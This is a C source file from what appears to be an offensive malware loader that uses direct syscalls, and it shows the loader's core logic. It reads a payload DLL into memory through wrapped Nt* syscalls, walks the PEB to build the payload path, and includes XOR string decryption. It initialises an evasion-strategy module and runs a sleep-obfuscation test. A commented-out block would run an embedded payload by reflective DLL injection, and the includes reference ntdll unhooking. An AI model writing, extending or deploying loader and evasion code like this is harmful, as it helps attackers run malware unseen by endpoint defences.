#include "../include/common_defines.h" // Should be the very first include

#include "../include/rtldr_ctx.h"
#include "../include/utils.h"    // For find_module_base, find_function, ReadPayloadFileToMemory (this file)
#include "../include/syscalls.h" // For all Nt* syscall wrappers and status codes
#include "../include/mem.h"      // For wrapped_NtAllocateVirtualMemory, wrapped_NtFreeVirtualMemory (if not directly via syscalls.h)
#include "../include/evasion.h"  // For unhook_ntdll etc.
#include "../include/rdi.h"      // For InvokeReflectiveLoader (will be called from here)
#include "../include/strategy.h"  // For our new evasion strategy framework
// #include "payload.h"            // EMBEDDED PAYLOAD - Not used in current simplified version
#ifdef _DEBUG
#include <stdio.h>
#endif
#include <winternl.h>

// --- No-CRT memcpy implementation ---
#pragma function(memcpy)
void *memcpy(void *dst, const void *src, size_t n) {
    unsigned char *d = dst;
    const unsigned char *s = src;
    while (n--) *d++ = *s++;
    return dst;
}

// Custom string functions (no-CRT)
static WCHAR *pe_wstrcpy(WCHAR *dst, const WCHAR *src) {
    WCHAR *d = dst;
    while ((*d++ = *src++));
    return dst;
}

static WCHAR *pe_wstrcat(WCHAR *dst, const WCHAR *src) {
    WCHAR *d = dst;
    while (*d) d++;
    while ((*d++ = *src++));
    return dst;
}

// Simple XOR string decryption (compile-time encryption needed via build script)
static void xor_decrypt_wstring(LPWSTR str, SIZE_T len, BYTE key) {
    for (SIZE_T i = 0; i < len; i++) {
        str[i] ^= key;
    }
}

// Implementation for ReadPayloadFileToMemory
BOOL ReadPayloadFileToMemory(PRTLDR_CTX ctx, LPCWSTR pwszFileName, PBYTE* ppPayloadBuffer, PDWORD pdwPayloadSize) {
    if (!ctx || !ctx->syscalls_initialized || !pwszFileName || !ppPayloadBuffer || !pdwPayloadSize) {
        return FALSE;
    }

    *ppPayloadBuffer = NULL;
    *pdwPayloadSize = 0;

    HANDLE hFile = NULL;
    NTSTATUS status;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK ioStatusBlock;
    UNICODE_STRING uFileName;

    SIZE_T fileNameLength = 0;
    LPCWSTR p = pwszFileName;
    while (*p) { fileNameLength++; p++; }

    uFileName.Buffer = (PWSTR)pwszFileName;
    uFileName.Length = (USHORT)(fileNameLength * sizeof(WCHAR));
    uFileName.MaximumLength = uFileName.Length;
    
    InitializeObjectAttributes(&objAttr, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = wrapped_NtCreateFile(&hFile, FILE_GENERIC_READ, &objAttr, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(status)) return FALSE;

    FILE_STANDARD_INFORMATION fileStdInfo;
    status = wrapped_NtQueryInformationFile(hFile, &ioStatusBlock, &fileStdInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
    if (!NT_SUCCESS(status)) {
        wrapped_NtClose(hFile);
        return FALSE;
    }

    DWORD fileSize = fileStdInfo.EndOfFile.LowPart;
    if (fileSize == 0) {
        wrapped_NtClose(hFile);
        return FALSE;
    }

    PVOID pBuffer = NULL;
    SIZE_T regionSize = fileSize;
    status = wrapped_NtAllocateVirtualMemory(NtCurrentProcess(), &pBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status) || !pBuffer) {
        wrapped_NtClose(hFile);
        return FALSE;
    }

    status = wrapped_NtReadFile(hFile, NULL, NULL, NULL, &ioStatusBlock, pBuffer, fileSize, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        SIZE_T actualRegionSize = regionSize; 
        wrapped_NtFreeVirtualMemory(NtCurrentProcess(), &pBuffer, &actualRegionSize, MEM_RELEASE);
        wrapped_NtClose(hFile);
        return FALSE;
    }

    *ppPayloadBuffer = (PBYTE)pBuffer;
    *pdwPayloadSize = fileSize;
    wrapped_NtClose(hFile);
    return TRUE;
}

static void debug_message(const char* msg) {
    #ifdef _DEBUG
    MessageBoxA(NULL, msg, "PE_DEBUG", MB_OK);
    #endif
}

static BOOL build_payload_nt_path(WCHAR *outBuf, SIZE_T outCch)
{
    PPEB peb = (PPEB)__readgsqword(0x60);
    if(!peb) return FALSE;
    PRTL_USER_PROCESS_PARAMETERS pParams = peb->ProcessParameters;
    if(!pParams) return FALSE;
    UNICODE_STRING img = pParams->ImagePathName;
    if(img.Length/sizeof(WCHAR) >= outCch-10) return FALSE;
    // copy until last backslash
    SIZE_T i=0; SIZE_T lastBS=0;
    for(; i< img.Length/sizeof(WCHAR); ++i){
        outBuf[i]=img.Buffer[i]; if(outBuf[i]==L'\\') lastBS=i;
    }
    outBuf[lastBS+1]=0; // truncate after last backslash
    pe_wstrcat(outBuf, L"test_payload.dll");
    // prepend NT prefix
    WCHAR tmp[260]; pe_wstrcpy(tmp, outBuf);
    pe_wstrcpy((WCHAR*)outBuf, (const WCHAR*)L"\\??\\");
    pe_wstrcat((WCHAR*)outBuf, (const WCHAR*)tmp);
    return TRUE;
}

// Main function of the core loader logic
int CoreLoaderMain(void) {
    RTLDR_CTX ctx_val;
    PRTLDR_CTX ctx = &ctx_val;
    EVASION_STRATEGY strategy; // Allocate strategy struct on the stack

    // Link the strategy module into the context
    ctx->strategy = &strategy;

    // Initialize context: ntdll_base
    ctx->ntdll_base = find_module_base(L"ntdll.dll");
    if (!ctx->ntdll_base) {
        // Critical failure: cannot find ntdll
        return -2; 
    }
    ctx->syscalls_initialized = FALSE; // Initialize to FALSE

    // Initialize syscalls (this caches syscall IDs)
    ctx->syscalls_initialized = initialize_syscalls(ctx);
    if (!ctx->syscalls_initialized) {
        // Critical failure: cannot initialize syscalls
        return -3;
    }

    // Initialize our Evasion Strategy module
    if (!Strategy_Initialize(ctx, ctx->strategy)) {
        // Critical failure: cannot initialize evasion strategy
        return -4;
    }

    // --- TEST: Invoke Sleep Obfuscation ---
    // Instead of running the payload, we will test our new sleep obfuscation module.
    debug_message("Framework initialized. Testing sleep obfuscation for 5 seconds...");

    if (ctx->strategy->pfnObfuscateSleep) {
        if (ctx->strategy->pfnObfuscateSleep(ctx, 5000)) {
            debug_message("Sleep obfuscation test PASSED.");
        } else {
            debug_message("Sleep obfuscation test FAILED.");
        }
    } else {
        debug_message("Sleep obfuscation function not available in strategy.");
    }
    
    // The original payload execution is commented out for this test.
    /*
    PBYTE pPayloadBuffer = raw_reflective_dll;
    DWORD dwPayloadSize = raw_reflective_dll_len;

    if (pPayloadBuffer && dwPayloadSize > 0) {
        #ifdef _DEBUG
        debug_message("Payload is embedded. Attempting to execute...");
        #endif
        
        NTSTATUS rdiStatus = InvokeReflectiveLoader(ctx, pPayloadBuffer, "ReflectiveLoader", NULL);

        if (NT_SUCCESS(rdiStatus)) {
            debug_message("InvokeReflectiveLoader SUCCESS");
        } else {
            debug_message("InvokeReflectiveLoader FAILED");
        }
    } else {
        debug_message("Embedded payload not found or is empty!");
    }
    */

    // Loader has done its main job. 
    // The stub (RealEntry) will call NtTerminateProcess after this returns.
    return 0; // Success
}

// ... rest of the file ... 